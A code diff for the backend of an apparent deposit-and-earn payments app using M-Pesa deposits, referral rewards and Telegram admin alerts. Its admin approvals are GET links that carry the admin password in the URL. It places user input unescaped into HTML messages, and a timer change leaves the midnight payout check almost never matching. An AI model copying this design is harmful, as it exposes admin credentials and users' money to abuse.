@@ -58,7 +58,7 @@ const userSchema = new mongoose.Schema({
   name: String,
   email: String,
   password: String,
-  phone: String, // optional: current phone
+  phone: String,
   balance: { type: Number, default: 0 },
   earning: { type: Number, default: 0 },
   lockedBonus: { type: Number, default: 0 },
@@ -67,7 +67,7 @@ const userSchema = new mongoose.Schema({
   referredBy: String,
   lastPaid: String,
   firstDepositMade: { type: Boolean, default: false },
-  firstDepositPhone: String, // <-- store first deposit number
+  depositNumber: String, // first number used for deposit
   createdAt: { type: Date, default: Date.now }
 });
 
@@ -79,7 +79,8 @@ const depositSchema = new mongoose.Schema({
   mpesaCode: String,
   status: String,
   requestedAt: Date,
-  processedAt: Date
+  processedAt: Date,
+  message_id: Number
 });
 
 const withdrawalSchema = new mongoose.Schema({
@@ -89,7 +90,8 @@ const withdrawalSchema = new mongoose.Schema({
   amount: Number,
   status: String,
   requestedAt: Date,
-  processedAt: Date
+  processedAt: Date,
+  message_id: Number
 });
 
 const User = mongoose.model('User', userSchema);
@@ -100,7 +102,7 @@ const Withdrawal = mongoose.model('Withdrawal', withdrawalSchema);
 function auth(req, res, next) {
   const a = req.headers.authorization;
   if (!a || !a.startsWith('Bearer ')) return res.status(401).json({ error: 'Unauthorized' });
-  try { req.user = jwt.verify(a.slice(7), SECRET); next(); }
+  try { req.user = jwt.verify(a.slice(7), SECRET); next(); } 
   catch { return res.status(401).json({ error: 'Invalid token' }); }
 }
 
@@ -113,9 +115,18 @@ async function tgSend(text, buttons) {
   }).catch(e => console.error('TG send error', e));
 }
 
+async function tgEditMessage(chat_id, message_id, newText) {
+  if (!TG_BOT) return;
+  await fetch(`https://api.telegram.org/bot${TG_BOT}/editMessageText`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ chat_id, message_id, text: newText, parse_mode: 'HTML' })
+  }).catch(e => console.error('TG edit error', e));
+}
+
 // ===================== ROUTES =====================
 
-// Register with 200 KES reward
+// Register
 app.post('/api/register', async (req, res) => {
   const { name, email, password, referrerEmail } = req.body || {};
   if (!name || !email || !password) return res.status(400).json({ error: 'Name, email, and password are required' });
@@ -129,15 +140,14 @@ app.post('/api/register', async (req, res) => {
     password: hashed,
     referredBy: ref,
     balance: 0,
-    earning: 200, // immediate reward
+    earning: 200, // reward on registration
     lockedBonus: 0,
-    firstDepositMade: false,
-    firstDepositPhone: null
+    firstDepositMade: false
   });
   await user.save();
 
   const token = jwt.sign({ email: user.email }, SECRET, { expiresIn: '7d' });
-  res.json({ message: 'Registered successfully. 200 KES reward added to earning balance.', token, email: user.email });
+  res.json({ message: 'Registered successfully. 200 KES reward added', token, email: user.email });
 });
 
 // Login
@@ -158,13 +168,20 @@ app.post('/api/deposit', auth, async (req, res) => {
 
   const u = await User.findOne({ email: req.user.email });
   if (!u) return res.status(404).json({ error: 'User not found' });
-
   if (amount < 500) return res.status(400).json({ error: 'Minimum deposit is 500 KES' });
 
   const pending = await Deposit.findOne({ email: u.email, status: 'PENDING' });
   if (pending) return res.status(400).json({ error: 'You have a pending deposit' });
 
-  const deposit = new Deposit({ id: crypto.randomUUID(), email: u.email, phone, amount: Number(amount), mpesaCode, status: 'PENDING', requestedAt: Date.now() });
+  const deposit = new Deposit({
+    id: crypto.randomUUID(),
+    email: u.email,
+    phone,
+    amount: Number(amount),
+    mpesaCode,
+    status: 'PENDING',
+    requestedAt: Date.now()
+  });
   await deposit.save();
 
   const text = `🟢 <b>New Deposit Request</b>\nEmail: ${u.email}\nPhone: ${phone}\nAmount: KES ${amount}\nMPESA Code: <b>${mpesaCode}</b>\nDeposit ID: ${deposit.id}\nStatus: PENDING`;
@@ -172,7 +189,15 @@ app.post('/api/deposit', auth, async (req, res) => {
     { text: '✅ Approve', url: `${DOMAIN}/api/admin/deposits/${deposit.id}/approve?token=${ADMIN_PASS}` },
     { text: '❌ Reject', url: `${DOMAIN}/api/admin/deposits/${deposit.id}/reject?token=${ADMIN_PASS}` }
   ]];
-  await tgSend(text, buttons);
+
+  const response = await fetch(`https://api.telegram.org/bot${TG_BOT}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML', reply_markup: { inline_keyboard: buttons } })
+  });
+  const data = await response.json();
+  deposit.message_id = data.result.message_id;
+  await deposit.save();
 
   res.json({ message: 'Deposit submitted. Wait for admin approval' });
 });
@@ -191,17 +216,18 @@ app.get('/api/admin/deposits/:id/:action', async (req, res) => {
   deposit.processedAt = Date.now();
   await deposit.save();
 
+  const statusEmoji = deposit.status === 'APPROVED' ? '✅' : '❌';
+  const newText = `🟢 Deposit ${deposit.status} ${statusEmoji}\nEmail: ${deposit.email}\nPhone: ${deposit.phone}\nAmount: KES ${deposit.amount}`;
+  if (deposit.message_id) await tgEditMessage(TG_CHAT, deposit.message_id, newText);
+
   if (deposit.status === 'APPROVED') {
     const u = await User.findOne({ email: deposit.email });
     if (u) {
       u.balance += Number(deposit.amount);
       if (!u.firstDepositMade && deposit.amount >= 500) {
         u.firstDepositMade = true;
-        u.firstDepositPhone = deposit.phone; // <-- first deposit phone locked
+        if (!u.depositNumber) u.depositNumber = deposit.phone;
       }
-      await u.save();
-
-      // Referral reward
       if (u.referredBy) {
         const refUser = await User.findOne({ email: u.referredBy });
         if (refUser) {
@@ -212,13 +238,14 @@ app.get('/api/admin/deposits/:id/:action', async (req, res) => {
           }
         }
       }
+      await u.save();
     }
   }
 
   res.send(`Deposit ${deposit.status}`);
 });
 
-// Withdraw (Mon-Fri, earnings, first deposit phone only)
+// Withdraw
 app.post('/api/withdraw', auth, async (req, res) => {
   const { amount, phone } = req.body || {};
   if (!amount || !phone) return res.status(400).json({ error: 'amount & phone required' });
@@ -226,14 +253,12 @@ app.post('/api/withdraw', auth, async (req, res) => {
   const u = await User.findOne({ email: req.user.email });
   if (!u) return res.status(404).json({ error: 'User not found' });
 
-  const today = new Date().getDay();
-  if (today === 0 || today === 6) return res.status(400).json({ error: 'Withdrawals allowed Monday to Friday only 😞' });
+  const now = new Date();
+  const day = now.getDay(); // 0=Sunday, 6=Saturday
+  if (day === 0 || day === 6) return res.status(400).json({ error: 'Withdrawals only Monday to Friday' });
 
-  if (!u.firstDepositMade) return res.status(400).json({ error: 'Cannot withdraw before first deposit ≥ 500' });
-
-  // Check first deposit phone
-  if (phone !== u.firstDepositPhone) return res.status(400).json({ error: 'Withdrawals must use the phone number of your first deposit' });
-
+  if (!u.firstDepositMade) return res.status(400).json({ error: 'Deposit 500+ first before withdrawing' });
+  if (phone !== u.depositNumber) return res.status(400).json({ error: 'Withdrawal phone must match first deposit number' });
   if (u.earning < Number(amount)) return res.status(400).json({ error: 'Insufficient earnings balance' });
 
   const pending = await Withdrawal.findOne({ email: u.email, status: 'PENDING' });
@@ -247,7 +272,15 @@ app.post('/api/withdraw', auth, async (req, res) => {
     { text: '✅ Approve', url: `${DOMAIN}/api/admin/withdrawals/${w.id}/approve?token=${ADMIN_PASS}` },
     { text: '❌ Reject', url: `${DOMAIN}/api/admin/withdrawals/${w.id}/reject?token=${ADMIN_PASS}` }
   ]];
-  await tgSend(text, buttons);
+
+  const resSend = await fetch(`https://api.telegram.org/bot${TG_BOT}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML', reply_markup: { inline_keyboard: buttons } })
+  });
+  const data = await resSend.json();
+  w.message_id = data.result.message_id;
+  await w.save();
 
   res.json({ message: 'Withdrawal submitted' });
 });
@@ -265,6 +298,10 @@ app.get('/api/admin/withdrawals/:id/:action', async (req, res) => {
   w.status = action.toUpperCase() === 'APPROVE' ? 'APPROVED' : 'REJECTED';
   w.processedAt = Date.now();
   await w.save();
+
+  const statusEmoji = w.status === 'APPROVED' ? '✅' : '❌';
+  const newText = `🔵 Withdrawal ${w.status} ${statusEmoji}\nEmail: ${w.email}\nPhone: ${w.phone}\nAmount: KES ${w.amount}`;
+  if (w.message_id) await tgEditMessage(TG_CHAT, w.message_id, newText);
 
   if (w.status === 'APPROVED') {
     const u = await User.findOne({ email: w.email });
@@ -301,7 +338,7 @@ setInterval(async () => {
   const hours = now.toLocaleString('en-US', { hour12: false, hour: '2-digit', timeZone: 'Africa/Nairobi' });
   const minutes = now.toLocaleString('en-US', { minute: '2-digit', timeZone: 'Africa/Nairobi' });
   if (Number(hours) === 0 && Number(minutes) === 0) await runDailyEarnings();
-}, 60000);
+}, 5601000);
 
 // Status
 app.get('/api/status', (req, res) => res.json({ status: 'ok', time: Date.now(), till: MPESA_TILL, name: MPESA_NAME }));
